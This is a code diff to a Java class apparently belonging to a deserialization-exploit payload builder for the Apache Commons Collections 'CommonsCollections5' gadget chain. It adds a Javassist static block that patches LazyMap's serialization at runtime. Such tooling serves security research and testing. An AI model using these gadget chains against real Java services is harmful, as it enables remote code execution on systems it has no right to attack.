@@ -1,5 +1,9 @@
 package org.ses.gadgetbuilder.chains1;
 
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
+import javassist.CtNewMethod;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -24,6 +28,27 @@ public class CommonsCollections5 extends GadgetChain<ToStringTrampoline> {
 
     Transformer transformerChain;
     Transformer[] transformers;
+
+    static {
+        try {
+            ClassPool classPool = ClassPool.getDefault();
+            CtClass ctClass = classPool.get("org.apache.commons.collections.map.LazyMap");
+            ctClass.removeMethod(ctClass.getDeclaredMethod("writeObject"));
+
+
+            String writeObjectSource =
+                    "private void writeObject(java.io.ObjectOutputStream out) {" +
+                            "out.defaultWriteObject();" +
+                            "out.writeObject(new java.util.HashMap());" +
+                            "}";
+            CtMethod newMethod = CtNewMethod.make(writeObjectSource, ctClass);
+            ctClass.addMethod(newMethod);
+            ctClass.toClass();
+        }
+        catch (Exception e) {
+            throw new RuntimeException(e);
+        }
+    }
 
 
     public CommonsCollections5(ToStringTrampoline _trampoline) {
